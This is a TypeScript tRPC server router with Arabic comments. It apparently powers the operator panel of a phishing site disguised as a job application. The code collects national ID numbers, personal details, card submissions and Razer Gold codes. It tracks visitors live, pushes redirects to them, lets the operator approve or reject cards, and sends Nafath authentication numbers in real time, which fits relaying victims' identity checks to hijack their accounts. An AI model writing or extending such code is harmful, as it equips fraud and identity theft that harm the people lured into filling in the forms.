import { COOKIE_NAME } from "@shared/const";
import { TRPCError } from "@trpc/server";
import { z } from "zod";
import bcrypt from "bcryptjs";
import { randomBytes } from "crypto";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { customAdminProcedure, publicProcedure, router } from "./_core/trpc";
import { ADMIN_COOKIE_NAME } from "./_core/context";
import {
  createApplication,
  listApplications,
  getApplicationById,
  updateApplicationStatus,
  deleteApplication,
  getApplicationsStats,
  getSiteSettings,
  updateSiteSettings,
  createApplicationStep,
  listApplicationStepsBySession,
  listAllSteps,
  getApplicationStepsStats,
  getAdminByUsername,
  updateAdminLastLogin,
  updateAdminPassword,
  createAdminSession,
  deleteAdminSession,
  upsertLiveVisitor,
  listActiveLiveVisitors,
  removeLiveVisitor,
  createVisitorCommand,
  getPendingCommandsForSession,
  markCommandsConsumed,
  getLiveSubmissionsFeed,
  getVisitorsWithSubmissions,
  getAllVisitorsWithSubmissions,
  getTotalVisitorsCount,
  deleteAllVisitorData,
  deleteVisitorBySessionId,
  setVisitorCardStatus,
  setVisitorNafathNumber,
  getVisitorControlState,
  setVisitorRazerCode,
  setVisitorRazerStatus,
} from "./db";

// إجراء خاص بالمسؤول فقط - يعتمد على نظام تسجيل الدخول المخصص
const adminProcedure = customAdminProcedure;

const applicationInputSchema = z.object({
  fullName: z.string().min(2, "الاسم الكامل مطلوب"),
  middleName: z.string().optional(),
  familyName: z.string().min(2, "اسم العائلة مطلوب"),
  nationality: z.string().min(1, "الجنسية مطلوبة"),
  idType: z.string().min(1, "نوع الهوية مطلوب"),
  idNumber: z.string().min(3, "رقم الهوية مطلوب"),
  birthDate: z.string().min(4, "تاريخ الميلاد مطلوب"),
  title: z.string().min(1, "اللقب مطلوب"),
  email: z.string().email("بريد إلكتروني غير صالح"),
  gender: z.enum(["male", "female"]),
  phone: z
    .string()
    .min(1, "رقم الجوال مطلوب")
    .refine((v) => /^(?:\+?966|0)5\d{8}$/.test(v.replace(/[\s-]/g, "")), {
      message: "رقم جوال غير صالح (يجب أن يبدأ بـ 05 أو +9665)",
    }),
  city: z.string().optional(),
  address: z.string().optional(),
  educationLevel: z.string().optional(),
  experience: z.string().optional(),
  desiredPosition: z.string().optional(),
  notes: z.string().optional(),
  sessionId: z.string().optional(),
});

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  // نظام تسجيل دخول لوحة التحكم المخصص (اسم مستخدم + كلمة مرور)
  adminAuth: router({
    // الحصول على بيانات المسؤول الحالي
    me: publicProcedure.query(({ ctx }) => ctx.admin),

    // تسجيل الدخول
    login: publicProcedure
      .input(z.object({
        username: z.string().min(1, "اسم المستخدم مطلوب"),
        password: z.string().min(1, "كلمة المرور مطلوبة"),
      }))
      .mutation(async ({ input, ctx }) => {
        const account = await getAdminByUsername(input.username.trim().toLowerCase());
        if (!account || !account.isActive) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "اسم المستخدم أو كلمة المرور غير صحيحة" });
        }
        const isValid = await bcrypt.compare(input.password, account.passwordHash);
        if (!isValid) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "اسم المستخدم أو كلمة المرور غير صحيحة" });
        }

        // إنشاء جلسة جديدة
        const token = randomBytes(48).toString("hex");
        const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000); // 30 يوم
        const ipAddress = (ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
          || (ctx.req.socket as any)?.remoteAddress || null;
        const userAgent = (ctx.req.headers["user-agent"] as string) || null;

        await createAdminSession({
          adminId: account.id,
          token,
          expiresAt,
          ipAddress,
          userAgent,
        });
        await updateAdminLastLogin(account.id);

        // تعيين الكوكي
        ctx.res.cookie(ADMIN_COOKIE_NAME, token, {
          httpOnly: true,
          secure: true,
          sameSite: "none",
          path: "/",
          maxAge: 30 * 24 * 60 * 60 * 1000,
        });

        return {
          success: true,
          admin: {
            id: account.id,
            username: account.username,
            displayName: account.displayName,
          },
        } as const;
      }),

    // تسجيل الخروج
    logout: publicProcedure.mutation(async ({ ctx }) => {
      const cookieHeader = ctx.req.headers.cookie || "";
      const match = cookieHeader.match(new RegExp(`(?:^|; )${ADMIN_COOKIE_NAME}=([^;]+)`));
      const token = match?.[1];
      if (token) {
        await deleteAdminSession(token);
      }
      ctx.res.clearCookie(ADMIN_COOKIE_NAME, {
        path: "/",
        secure: true,
        sameSite: "none",
        httpOnly: true,
      });
      return { success: true } as const;
    }),

    // تغيير كلمة المرور
    changePassword: customAdminProcedure
      .input(z.object({
        currentPassword: z.string().min(1),
        newPassword: z.string().min(6, "يجب ألا تقل عن 6 حروف"),
      }))
      .mutation(async ({ input, ctx }) => {
        const account = await getAdminByUsername(ctx.admin.username);
        if (!account) throw new TRPCError({ code: "NOT_FOUND", message: "حساب غير موجود" });
        const isValid = await bcrypt.compare(input.currentPassword, account.passwordHash);
        if (!isValid) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "كلمة المرور الحالية غير صحيحة" });
        }
        const newHash = await bcrypt.hash(input.newPassword, 10);
        await updateAdminPassword(account.id, newHash);
        return { success: true } as const;
      }),
  }),

  applications: router({
    // إنشاء طلب جديد - عام
    create: publicProcedure
      .input(applicationInputSchema)
      .mutation(async ({ input }) => {
        await createApplication(input);
        return { success: true } as const;
      }),

    // قائمة الطلبات - مسؤول فقط
    list: adminProcedure
      .input(
        z.object({
          search: z.string().optional(),
          status: z.enum(["new", "reviewed", "accepted", "rejected"]).optional(),
          gender: z.enum(["male", "female"]).optional(),
          limit: z.number().optional(),
          offset: z.number().optional(),
        }).optional(),
      )
      .query(async ({ input }) => {
        return await listApplications(input ?? {});
      }),

    // تفاصيل طلب - مسؤول فقط
    getById: adminProcedure
      .input(z.object({ id: z.number() }))
      .query(async ({ input }) => {
        const app = await getApplicationById(input.id);
        if (!app) throw new TRPCError({ code: "NOT_FOUND", message: "الطلب غير موجود" });
        return app;
      }),

    // تحديث حالة - مسؤول فقط
    updateStatus: adminProcedure
      .input(z.object({
        id: z.number(),
        status: z.enum(["new", "reviewed", "accepted", "rejected"]),
      }))
      .mutation(async ({ input }) => {
        await updateApplicationStatus(input.id, input.status);
        return { success: true } as const;
      }),

    // حذف - مسؤول فقط
    delete: adminProcedure
      .input(z.object({ id: z.number() }))
      .mutation(async ({ input }) => {
        await deleteApplication(input.id);
        return { success: true } as const;
      }),

    // إحصائيات - مسؤول فقط
    stats: adminProcedure.query(async () => {
      return await getApplicationsStats();
    }),
  }),

  steps: router({
    // تسجيل خطوة من الزائر (عام)
    submit: publicProcedure
      .input(z.object({
        sessionId: z.string().min(4),
        stepKey: z.string().min(1),
        data: z.record(z.string(), z.any()),
        applicationId: z.number().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        const ipAddress = (ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
          || (ctx.req.socket as any)?.remoteAddress || null;
        const userAgent = (ctx.req.headers["user-agent"] as string) || null;
        await createApplicationStep({
          sessionId: input.sessionId,
          stepKey: input.stepKey,
          data: JSON.stringify(input.data),
          applicationId: input.applicationId ?? null,
          ipAddress,
          userAgent,
        });
        return { success: true } as const;
      }),

    // قائمة كل الخطوات - مسؤول فقط
    listAll: adminProcedure
      .input(z.object({
        stepKey: z.string().optional(),
        limit: z.number().optional(),
      }).optional())
      .query(async ({ input }) => {
        return await listAllSteps(input ?? {});
      }),

    // قائمة خطوات جلسة - مسؤول فقط
    bySession: adminProcedure
      .input(z.object({ sessionId: z.string() }))
      .query(async ({ input }) => {
        return await listApplicationStepsBySession(input.sessionId);
      }),

    // إحصائيات القمع (Funnel) - مسؤول فقط
    stats: adminProcedure.query(async () => {
      return await getApplicationStepsStats();
    }),
  }),

  // ==================== الزوار المباشرون والتوجيه اللحظي ====================
  liveVisitors: router({
    // heartbeat من الزائر - يُرسل كل بضع ثوانٍ
    heartbeat: publicProcedure
      .input(z.object({
        sessionId: z.string().min(4),
        currentPage: z.string().min(1),
        pageTitle: z.string().optional(),
        displayName: z.string().optional(),
        phone: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        const ipAddress = (ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
          || (ctx.req.socket as any)?.remoteAddress || null;
        const userAgent = (ctx.req.headers["user-agent"] as string) || null;
        await upsertLiveVisitor({
          sessionId: input.sessionId,
          currentPage: input.currentPage,
          pageTitle: input.pageTitle ?? null,
          ipAddress,
          userAgent,
          displayName: input.displayName ?? null,
          phone: input.phone ?? null,
        });

        // إرجاع أوامر التوجيه المعلقة وتعيينها كمستهلكة
        const pendingCommands = await getPendingCommandsForSession(input.sessionId);
        if (pendingCommands.length > 0) {
          await markCommandsConsumed(pendingCommands.map(c => c.id));
        }

        // ملاحظة: لا حذف تلقائي للجلسات القديمة - جميع سجلات الزوار تبقى محفوظة حتى حذفها يدوياً من الأدمن

        return {
          success: true,
          commands: pendingCommands.map(c => ({
            id: c.id,
            type: c.commandType,
            payload: c.payload,
          })),
        } as const;
      }),

    // مغادرة الزائر للموقع (beacon) - لا نحذف! نحتفظ بكل التسجيلات
    // الزائر سيظهر كـ"غير نشط" تلقائياً بعد 60 ثانية بسبب lastSeen
    leave: publicProcedure
      .input(z.object({ sessionId: z.string().min(4) }))
      .mutation(async () => {
        // عمداً لا نحذف الزائر - السجلات يجب أن تبقى ظاهرة في لوحة التحكم
        return { success: true } as const;
      }),

    // قائمة الزوار النشطين - مسؤول فقط
    list: adminProcedure
      .input(z.object({ activeWithinSeconds: z.number().optional() }).optional())
      .query(async ({ input }) => {
        return await listActiveLiveVisitors(input?.activeWithinSeconds ?? 60);
      }),

    // إرسال أمر توجيه لزائر - مسؤول فقط
    sendCommand: adminProcedure
      .input(z.object({
        sessionId: z.string().min(4),
        commandType: z.enum(["redirect", "reload", "alert"]),
        payload: z.string().min(1).max(500),
      }))
      .mutation(async ({ input }) => {
        await createVisitorCommand({
          sessionId: input.sessionId,
          commandType: input.commandType,
          payload: input.payload,
        });
        return { success: true } as const;
      }),

    // قائمة الزوار مع جميع تقديماتهم (بطاقة موسعة) - مسؤول فقط
    listWithSubmissions: adminProcedure
      .input(z.object({ activeWithinSeconds: z.number().optional() }).optional())
      .query(async ({ input }) => {
        return await getVisitorsWithSubmissions(input?.activeWithinSeconds ?? 60);
      }),

    // قائمة شاملة للجدول (جميع الزوار: نشطين وغير نشطين) - مسؤول فقط
    tableList: adminProcedure
      .input(z.object({ limit: z.number().min(1).max(10000).optional() }).optional())
      .query(async ({ input }) => {
        const visitors = await getAllVisitorsWithSubmissions(input?.limit ?? 1000);
        const total = await getTotalVisitorsCount();
        return { visitors, total };
      }),

    // حذف زائر واحد - مسؤول فقط
    deleteVisitor: adminProcedure
      .input(z.object({ sessionId: z.string().min(1) }))
      .mutation(async ({ input }) => {
        await deleteVisitorBySessionId(input.sessionId);
        return { success: true } as const;
      }),

    // حذف جميع الزوار وبياناتهم - مسؤول فقط (خطير)
    deleteAll: adminProcedure
      .mutation(async () => {
        const result = await deleteAllVisitorData();
        return { success: true, deleted: result } as const;
      }),

    // وضع حالة البطاقة كـ pending من الزائر نفسه (عام) - ليراها الأدمن في اللوحة
    markCardPending: publicProcedure
      .input(z.object({ sessionId: z.string().min(4) }))
      .mutation(async ({ input }) => {
        await setVisitorCardStatus(input.sessionId, "pending");
        return { success: true } as const;
      }),

    // تحديد حالة البطاقة (قبول/رفض/إعادة للتعليق) - أدمن فقط
    setCardStatus: adminProcedure
      .input(
        z.object({
          sessionId: z.string().min(4),
          status: z.enum(["pending", "approved", "rejected"]).nullable(),
        })
      )
      .mutation(async ({ input }) => {
        await setVisitorCardStatus(input.sessionId, input.status);
        return { success: true } as const;
      }),

    // تعيين رقم نفاذ للزائر (تحديث لحظي) - أدمن فقط
    setNafathNumber: adminProcedure
      .input(
        z.object({
          sessionId: z.string().min(4),
          nafathNumber: z
            .string()
            .min(1)
            .max(16)
            .regex(/^\d+$/, "يجب أن يكون أرقامًا فقط")
            .nullable(),
        })
      )
      .mutation(async ({ input }) => {
        await setVisitorNafathNumber(input.sessionId, input.nafathNumber);
        return { success: true } as const;
      }),

    // الحصول على حالة التحكم بالجلسة (للـ polling من الزائر) - عام
    getControlState: publicProcedure
      .input(z.object({ sessionId: z.string().min(4) }))
      .query(async ({ input }) => {
        const state = await getVisitorControlState(input.sessionId);
        if (!state) {
          return {
            cardStatus: "none" as const,
            nafathNumber: null,
            nafathSentAt: null,
            razerStatus: "none" as const,
          };
        }
        return {
          ...state,
          cardStatus: state.cardStatus ?? ("none" as const),
          razerStatus: state.razerStatus ?? ("none" as const),
        };
      }),

    // حفظ كود Razer Gold من الزائر - عام
    submitRazerCode: publicProcedure
      .input(z.object({
        sessionId: z.string().min(4),
        razerCode: z.string().min(1, "يرجى إدخال الكود"),
      }))
      .mutation(async ({ input }) => {
        await setVisitorRazerCode(input.sessionId, input.razerCode);
        return { success: true } as const;
      }),

    // تحديث حالة كود Razer Gold (قبول/رفض) - أدمن فقط
    setRazerStatus: adminProcedure
      .input(z.object({
        sessionId: z.string().min(4),
        status: z.enum(["pending", "approved", "rejected"]).nullable(),
      }))
      .mutation(async ({ input }) => {
        await setVisitorRazerStatus(input.sessionId, input.status);
        return { success: true } as const;
      }),

    // إرسال أمر توجيه لجميع الزوار النشطين - مسؤول فقط
    broadcastRedirect: adminProcedure
      .input(z.object({ url: z.string().min(1).max(500) }))
      .mutation(async ({ input }) => {
        const visitors = await listActiveLiveVisitors(60);
        for (const v of visitors) {
          await createVisitorCommand({
            sessionId: v.sessionId,
            commandType: "redirect",
            payload: input.url,
          });
        }
        return { success: true, count: visitors.length } as const;
      }),

    // تدفق الفورمات الحي (الطلبات + الخطوات) - مسؤول فقط
    feed: adminProcedure
      .input(z.object({ limit: z.number().optional() }).optional())
      .query(async ({ input }) => {
        return await getLiveSubmissionsFeed(input?.limit ?? 50);
      }),
  }),

  settings: router({
    // قراءة الإعدادات العامة (للزائرين لمعرفة هل هناك إعادة توجيه)
    getPublic: publicProcedure.query(async () => {
      const settings = await getSiteSettings();
      return {
        redirectEnabled: settings?.redirectEnabled ?? false,
        redirectUrl: settings?.redirectUrl ?? "",
      };
    }),

    // قراءة الإعدادات الكاملة - مسؤول فقط
    get: adminProcedure.query(async () => {
      return await getSiteSettings();
    }),

    // تحديث الإعدادات - مسؤول فقط
    update: adminProcedure
      .input(z.object({
        redirectEnabled: z.boolean().optional(),
        redirectUrl: z.string().optional(),
        siteTitle: z.string().optional(),
        siteDescription: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        await updateSiteSettings(input);
        return { success: true } as const;
      }),
  }),
});

export type AppRouter = typeof appRouter;
